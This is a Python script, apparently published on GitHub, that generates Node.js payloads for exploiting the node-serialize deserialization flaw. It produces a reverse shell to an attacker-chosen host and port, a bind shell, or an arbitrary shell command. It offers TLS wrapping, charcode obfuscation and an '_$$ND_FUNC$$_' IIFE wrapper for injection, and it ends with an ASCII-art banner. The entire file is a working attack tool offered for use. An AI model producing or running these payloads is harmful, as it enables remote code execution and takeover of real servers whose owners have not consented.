# By: https://github.com/b0llull0s
# Based on: https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py

import getopt, sys, ssl, socket

def usage():
    print ('''
Usage: %s <TYPE> <HOST> <PORT> <ENCODE> [OPTIONS]

Help:
    -c : Run some linux commands (ls,cat...)
    -r : Get payload reverse shell
    -b : Get payload bind shell
    -h : IP address in case of reverse shell
    -p : Port
    -e : Encode shell
    -o : Create a object contain payload with Immediately invoked function expression (IIFE)
    -s : Use SSL/TLS
    -l : Log output to a file
    ''' % (sys.argv[0]))

try:
    opts, args = getopt.getopt(sys.argv[1:], "c:h:rbp:eosl", ["help"])
    if not opts:
        usage()
        sys.exit()
except getopt.GetoptError as err:
    print(err)
    usage()
    sys.exit(2)

type = host = port = command = ""
encode = ssl_enabled = log_enabled = object = False
for o, a in opts:
    if o == "-r":
        type = 'REVERSE'
    if o == "-b":
        type = 'BIND'
    if o == "-h":
        host = a
    if o == "-o":
        object = True
    if o == "-p":
        port = a
    if o == "-c":
        type = 'COMMAND'
        command = a
    if o == "-e":
        encode = True
    if o == "-s":
        ssl_enabled = True
    if o == "-l":
        log_enabled = True
    if o == "--help":
        usage()
        sys.exit()

def get_reverse_shell():
    shell_code = '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    HOST="%s";
    PORT="%s";
    TIMEOUT="5000";
    function c(HOST,PORT) {
        var client = new net.Socket();
        client.connect(PORT, HOST, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("Connected!\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
              client.end("Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), TIMEOUT);
        });
    }
    c(HOST,PORT);
    ''' % (host, port)
    return ssl_wrap(shell_code) if ssl_enabled else shell_code

def get_bind_shell():
    shell_code = '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    PORT="%s";
    var server = net.createServer(function (c) {
        var sh = spawn('/bin/sh', ['-i']);
        c.pipe(sh.stdin);
        sh.stdout.pipe(c);
        sh.stderr.pipe(c);
    });
    server.listen(PORT);
    ''' % (port)
    return ssl_wrap(shell_code) if ssl_enabled else shell_code

def get_command(command):
    return '''
        require('child_process').exec('%s', function(error, stdout, stderr) {
            console.log(error)
            console.log(stdout)
        })
        ''' % (command)

def encode_string(string):
    string_encoded = ''
    for char in string:
        string_encoded += "," + str(ord(char))
    return string_encoded[1:]

def ssl_wrap(shell_code):
    return '''
    var net = require('net');
    var tls = require('tls');
    var fs = require('fs');
    var spawn = require('child_process').spawn;
    var options = {
      key: fs.readFileSync('/path/to/your/private-key.pem'),
      cert: fs.readFileSync('/path/to/your/certificate.pem')
    };
    HOST="%s";
    PORT="%s";
    function c(HOST,PORT) {
        var client = tls.connect(PORT, HOST, options, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("Connected!\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
              client.end("Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), 5000);
        });
    }
    c(HOST,PORT);
    ''' % (host, port)

payload = ""
if type == 'BIND':
    payload = get_bind_shell()
elif type == 'REVERSE':
    payload = get_reverse_shell()
else:
    payload = get_command(command);

if encode:
    payload = encode_string(payload)

if object:
    payload = '''
    {"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}
    ''' % (payload)

if log_enabled:
    with open('lapsus.log', 'a') as log_file:
        log_file.write(payload + '\n')

print("      .. ..',..''''','',,,,,,,,,,',,,,'.,,',,,,,,;,,,,,,,,,,,,'.',,'.  ...")
print("       .   ..'...'.,'''''',,;;;,,,,;,,''.',';,,,;;;;;,,,,,,'......,'.    ..")
print("            .'..'..'',,;,;;;;;;;,;;;,,.';;;',;;;;:;;;;;;;,,...''';,.   .")
print("             .....'''''''''''''''''''..''''.'''''''''''''''''.....'.")
print("            .,;;:;;::::;,,,'''.'',;;::;;;;::::;,,'',;;;;:::::;;;;;'.    ....")
print("           .',,,''',,,,','.. .......',''',,,''''.....''',,,,,'',,,'.    ....")
print("           ....''.....            . .',,','..... .   ........'',,,''.     .")
print("            ... .                   ..';;;.....                .'''..")
print("            .                         .........                    .")
print("         .'.                          ..'......                    ...")
print("         ',.           ...     ..    .;,,,'.'..              ..     ''")
print("         .'            ...         .'','''.','.                     ...")
print("        .',.    ........'.  .    .,;,. ..  .:;,'.       ....        .,'")
print("        ..''.   ...'.......... ..','.       .''''.   .........      ....")
print("       .....,,.....'......'....,,,;.         .''',,............    .',..")
print("      .';,. ..''''''..',;,;,,.'',,'          .......''','........''''..'")
print("   ....,,''..   ......',''..   .'.             ..........''...'.......''.")
print("   ...',;,,...      ..,,;;'.. .;.              .....,,,'.'.. ......';;;:,....")
print("       .....          ....,,....                .'.','''..      ...''''.. ..")
print("        ...   . ..       .,,..''                .'.,;,'..    ...  ...,.")
print("               ............;,.,,.       ..      ''',,....  ...'.....'..")
print("                    .........'''.      .'.     ..''.... ........   ..")
print("                     ...''.';:;;;;'...;:;,'....;':;,','  .;,..                  ..")
print (payload)
